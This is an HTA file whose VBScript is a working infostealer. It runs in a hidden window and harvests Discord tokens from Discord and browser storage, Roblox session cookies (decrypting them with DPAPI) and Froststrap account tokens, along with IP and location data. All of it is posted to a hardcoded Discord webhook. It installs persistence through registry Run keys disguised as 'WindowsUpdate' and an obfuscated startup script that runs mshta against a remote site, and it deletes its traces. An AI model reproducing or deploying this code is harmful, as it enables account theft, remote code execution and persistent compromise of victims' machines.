<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, PC, USER
Set sh  = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

Const WH = "https://discord.com/api/webhooks/1564088097514192938/WWdT5daixn2xuoaab_9J-SS7xk4WknR0sFm3MKCkftffH8qC8dblrIpJVfv0mOds5V1d"

PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

' --- Main chain ---
Call GrabTokens
Call IP
Call GrabRoblox
Call GrabFroststrap
Call Persistence

' --- Re-run grab chain 8x every 10 min ---
Dim i
For i = 1 To 8
    Call GrabTokens
    Call IP
    Call GrabRoblox
    Call GrabFroststrap
    If i < 8 Then Call SleepMinutes(10)
Next

window.close()

' ===================== SUBS =====================

Sub IP()
    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://api.ipify.org/", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ip: ip = Trim(xh.responseText)
    If Len(ip) < 7 Then Exit Sub

    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ll: ll = Split(xh.responseText, vbLf)
    Set xh = Nothing

    Dim info: info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | User: " & USER
    Call PostEmbed("Target", info, 3447003)
End Sub

Sub GrabTokens()
    ' Inline PS1 — no external fetch dependency
    Dim ps: ps = _
        "$out=@();" & _
        "$regex='[\w-]{24}\.[\w-]{6}\.[\w-]{25,}';" & _
        "$mfa='mfa\.[\w-]{84}';" & _
        "$paths=@(" & _
            "[IO.Path]::Combine($env:APPDATA,'discord','Local Storage','leveldb')," & _
            "[IO.Path]::Combine($env:APPDATA,'discordcanary','Local Storage','leveldb')," & _
            "[IO.Path]::Combine($env:APPDATA,'discordptb','Local Storage','leveldb')," & _
            "[IO.Path]::Combine($env:LOCALAPPDATA,'Google','Chrome','User Data','Default','Local Storage','leveldb')," & _
            "[IO.Path]::Combine($env:LOCALAPPDATA,'Microsoft','Edge','User Data','Default','Local Storage','leveldb')," & _
            "[IO.Path]::Combine($env:LOCALAPPDATA,'BraveSoftware','Brave-Browser','User Data','Default','Local Storage','leveldb')," & _
            "[IO.Path]::Combine($env:APPDATA,'Opera Software','Opera Stable','Local Storage','leveldb')" & _
        ");" & _
        "$seen=@{};" & _
        "foreach($dir in $paths){" & _
            "if(!(Test-Path $dir)){continue};" & _
            "Get-ChildItem $dir -File -ErrorAction SilentlyContinue|foreach{" & _
                "try{$raw=[IO.File]::ReadAllText($_.FullName)}catch{continue};" & _
                "$tokens=[regex]::Matches($raw,$mfa)+[regex]::Matches($raw,$regex);" & _
                "foreach($m in $tokens){" & _
                    "$t=$m.Value;" & _
                    "if($seen[$t]){continue};$seen[$t]=1;" & _
                    "try{" & _
                        "$h=@{Authorization=$t};" & _
                        "$r=Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers $h -EA Stop;" & _
                        "$phone=if($r.phone){$r.phone}else{''};" & _
                        "$email=if($r.email){$r.email}else{''};" & _
                        "$out+='DISCORD|'+$r.username+'#'+$r.discriminator+'|'+$email+'|'+$phone+'|'+$r.id+'|'+$t" & _
                    "}catch{}" & _
                "}" & _
            "}" & _
        "};" & _
        "$robloxPaths=@(" & _
            "[IO.Path]::Combine($env:LOCALAPPDATA,'Roblox','LocalStorage','robloxcookies.dat')," & _
            "[IO.Path]::Combine($env:LOCALAPPDATA,'Roblox','LocalStorage','RobloxCookies.dat')," & _
            "[IO.Path]::Combine($env:APPDATA,'Roblox','LocalStorage','robloxcookies.dat')" & _
        ");" & _
        "foreach($rp in $robloxPaths){" & _
            "if(Test-Path $rp){" & _
                "try{$rc=[IO.File]::ReadAllText($rp);if($rc.Length -gt 50){$out+='ROBLOX|'+$rc}}catch{}" & _
            "}" & _
        "};" & _
        "if($out.Count -eq 0){exit};" & _
        "$outFile=[IO.Path]::Combine($env:TEMP,'steal_result.txt');" & _
        "$out|Out-File $outFile -Encoding utf8"

    Dim psf: psf = TmpPath("steal.ps1")
    WriteFile psf, ps
    sh.Run "powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
    fso.DeleteFile psf, True

    Dim rf: rf = TmpPath("steal_result.txt")
    If Not fso.FileExists(rf) Then Exit Sub
    Dim raw: raw = ReadFile(rf)
    fso.DeleteFile rf, True

    Dim lines: lines = Split(raw, vbLf)
    Dim ln
    For Each ln In lines
        ln = Trim(ln)
        If Len(ln) < 10 Then GoTo NextLine

        If Left(ln, 8) = "DISCORD|" Then
            Dim parts: parts = Split(Mid(ln, 9), "|")
            If UBound(parts) >= 4 Then
                Dim body: body = "User: " & parts(0) & vbCrLf
                If parts(1) <> "" Then body = body & "Email: " & parts(1) & vbCrLf
                If parts(2) <> "" Then body = body & "Phone: " & parts(2) & vbCrLf
                If parts(3) <> "0" And parts(3) <> "" Then body = body & "ID: " & parts(3) & vbCrLf
                body = body & "Token: " & parts(4)
                Call PostEmbed("Discord Token", body, 5793266)
            End If
        End If

        If Left(ln, 7) = "ROBLOX|" Then
            Call PostEmbed("Roblox Cookie", Mid(ln, 8), 65280)
        End If

        NextLine:
    Next
End Sub

Sub GrabRoblox()
    Dim paths(4)
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"

    Dim j, fp, raw
    For j = 0 To 4
        If fso.FileExists(paths(j)) Then fp = paths(j) : Exit For
    Next

    ' UWP fallback
    If Len(fp) = 0 Then
        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
        If fso.FolderExists(pk) Then
            Dim folder, subf
            Set folder = fso.GetFolder(pk)
            For Each subf In folder.SubFolders
                If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
                    If fso.FileExists(uwp) Then fp = uwp : Exit For
                End If
            Next
            Set folder = Nothing
        End If
    End If
    If Len(fp) = 0 Then Exit Sub

    raw = ReadFile(fp)
    If Len(raw) < 50 Then Exit Sub

    Dim cookie: cookie = ""
    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
        Dim sp: sp = InStr(raw, "CookiesData"":""")
        If sp > 0 Then
            sp = sp + 14
            Dim ep: ep = InStr(sp, raw, """")
            If ep > sp Then
                Dim b64: b64 = Mid(raw, sp, ep - sp)
                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
            End If
        End If
    End If
    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
        Dim rp: rp = InStr(raw, ".ROBLOSECURITY"): cookie = Mid(raw, rp)
    End If
    If Len(cookie) = 0 Then cookie = raw

    cookie = Replace(Replace(Replace(cookie, vbCr, ""), vbLf, ""), vbTab, "")
    cookie = Trim(cookie)
    Dim sc: sc = InStr(cookie, ";"): If sc > 0 Then cookie = Left(cookie, sc - 1)
    cookie = Trim(cookie)
    Dim warn: warn = InStr(cookie, "_|WARNING"): If warn > 1 Then cookie = Mid(cookie, warn)

    If Len(cookie) < 20 Then Exit Sub
    Call PostEmbed("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280)
    Call PostFile("cookie.txt", cookie)
End Sub

Sub GrabFroststrap()
    Dim fp: fp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Froststrap\Cache\AccountManager.json"
    If Not fso.FileExists(fp) Then
        Dim fdir: fdir = sh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap\InstallLocation")
        If fdir <> "" Then fp = fdir & "\Cache\AccountManager.json"
    End If
    If Not fso.FileExists(fp) Then Exit Sub

    Dim outf: outf = TmpPath("frost_out.txt")
    Dim ps: ps = _
        "Add-Type -AssemblyName System.Security;" & _
        "$p='" & fp & "';" & _
        "$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');" & _
        "$j=Get-Content $p -Raw|ConvertFrom-Json;" & _
        "$lines=@();" & _
        "foreach($a in $j.accounts){" & _
            "try{" & _
                "$eb=[Convert]::FromBase64String($a.SecurityToken);" & _
                "$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);" & _
                "$c=[Text.Encoding]::UTF8.GetString($db)" & _
            "}catch{$c='DECRYPT FAILED'};" & _
            "$lines+=$a.Username+' ['+$a.UserId+'] : '+$c" & _
        "};" & _
        "($lines -join [char]10)|Out-File '" & outf & "' -Encoding utf8"

    Dim psf: psf = TmpPath("frost.ps1")
    WriteFile psf, ps
    sh.Run "powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
    fso.DeleteFile psf, True

    If fso.FileExists(outf) Then
        Dim result: result = ReadFile(outf)
        fso.DeleteFile outf, True
        If Len(Trim(result)) > 0 Then
            Call PostEmbed("Froststrap Accounts", result, 3447003)
            Call PostFile("froststrap.txt", result)
        End If
    End If
End Sub

Sub Persistence()
    Dim payload: payload = "mshta https://riggercheck.app/"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"

    Dim sp: sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
    Dim sf: Set sf = fso.CreateTextFile(sp, True)
    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
    sf.Close: Set sf = Nothing

    Call PostEmbed("Persistence", "3 startup methods installed | PC: " & PC & " | " & USER, 65280)
End Sub

' ===================== EXFIL =====================

Sub PostEmbed(t, d, c)
    If WH = "(put webhook here)" Then Exit Sub
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

Sub PostFile(fn, ct)
    If WH = "(put webhook here)" Then Exit Sub
    Dim DQ: DQ = Chr(34)
    Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
    h.Send bd
    Set h = Nothing
End Sub

' ===================== UTILITIES =====================

Function TmpPath(name): TmpPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function

Sub WriteFile(path, content)
    Dim f: Set f = fso.CreateTextFile(path, True)
    f.Write content: f.Close: Set f = Nothing
End Sub

Function ReadFile(path)
    ReadFile = ""
    Dim f: Set f = fso.OpenTextFile(path, 1)
    ReadFile = f.ReadAll: f.Close: Set f = Nothing
End Function

Sub SleepSeconds(s)
    sh.Run "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul", 0, True
End Sub

Sub SleepMinutes(m): Call SleepSeconds(m * 60): End Sub

Function DecryptDPAPI(b64)
    DecryptDPAPI = ""
    Dim inf: inf = TmpPath("dpi.txt")
    Dim outf: outf = TmpPath("dpo.txt")
    fso.DeleteFile outf, True
    WriteFile inf, b64
    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
    Dim psf: psf = TmpPath("dpapi.ps1")
    WriteFile psf, ps
    sh.Run "powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
    If fso.FileExists(outf) Then
        If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
    End If
    fso.DeleteFile inf, True: fso.DeleteFile psf, True: fso.DeleteFile outf, True
End Function

Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr,   Chr(92) & "n")
    Ej = Replace(Ej, vbLf,   Chr(92) & "n")
    Ej = Replace(Ej, vbTab,  Chr(92) & "t")
End Function
</script>
</head><body></body></html>
